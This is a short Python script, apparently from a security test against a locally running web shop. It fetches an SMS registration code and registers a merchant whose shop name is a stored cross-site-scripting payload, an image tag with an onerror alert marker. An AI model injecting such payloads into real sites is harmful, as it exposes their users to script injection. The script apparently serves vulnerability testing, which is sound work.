import urllib.request, urllib.parse, json, http.cookiejar, hashlib, os, re

BASE = 'http://127.0.0.1:8081'
work = r'D:\Backup\Downloads\awa-ddd\work\local-8081-20261106'
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
phone = '13966660003'
opener.open(BASE + '/api/session-state').read()
body = json.dumps({'phone': phone, 'type': 'register'}).encode()
req = urllib.request.Request(BASE + '/api/user/sms/send', data=body, headers={'Content-Type': 'application/json'}, method='POST')
print('sms send:', opener.open(req).read().decode())
sms = json.loads(opener.open(BASE + '/api/sms/list?phone=' + urllib.parse.quote(phone)).read().decode())
print('sms list:', json.dumps(sms, ensure_ascii=False))
code = re.search(r'(\d{4})', sms['data']['list'][0]['content']).group(1)
username = 'awa_shop1106x'
pwd = hashlib.sha256('shop@1234'.encode()).hexdigest()
shop_name = "<image src=x onerror=alert('AWA-XSS-SHOP-1106A1B2C3D4E5F6')>"
body = json.dumps({'username': username, 'shop_name': shop_name, 'phone': phone, 'password': pwd, 'sms_code': code}).encode()
req = urllib.request.Request(BASE + '/api/merchant/register', data=body, headers={'Content-Type': 'application/json'}, method='POST')
print('merchant register:', opener.open(req).read().decode())
